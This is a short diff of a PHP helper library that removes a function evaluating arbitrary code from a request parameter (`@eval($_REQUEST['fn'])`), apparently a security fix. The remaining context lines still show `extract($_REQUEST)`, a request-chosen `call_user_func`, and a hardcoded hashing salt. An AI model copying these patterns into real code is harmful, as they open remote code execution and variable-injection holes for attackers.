@@ -1871,7 +1871,6 @@ function _excluiDir($Dir){
 }
 function _extract()														{	if(extract($_REQUEST)){return true;}else{return false;}};
 function _exec($fn)														{	if(_extract() && !empty($_REQUEST['function']) && !empty($fn) && function_exists($fn) ) call_user_func($fn);}
-function _eval_fn()														{	@eval($_REQUEST['fn']);}
 function _crypt()														{	$CodeCru = @crypt(md5(rand(0,50)));$vowels = array("$","/", ".",'=');$onlyconsonants = str_replace($vowels, "", $CodeCru);return substr($onlyconsonants,1);}
 function _codePass($senha,$ash="aquiPODEserQUALQUERcoisaPOISéUMhash") 	{	
 	$salt 		= md5($ash);
